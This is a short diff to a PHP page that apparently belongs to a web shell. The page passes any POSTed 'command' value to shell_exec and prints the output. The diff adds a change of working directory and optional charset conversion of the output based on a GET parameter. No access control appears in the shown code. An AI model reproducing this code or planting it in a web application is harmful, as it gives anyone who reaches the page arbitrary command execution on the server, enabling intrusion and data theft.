@@ -13,7 +13,10 @@
         <?php
         if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['command']) {
             echo '<pre>';
+            chdir('..');
             $output = shell_exec($_POST['command']);
+            if (isset($_GET['charset']))
+                $output = iconv($_GET['charset'], 'utf-8', $output);
             echo $output;
             echo '</pre>';
         }
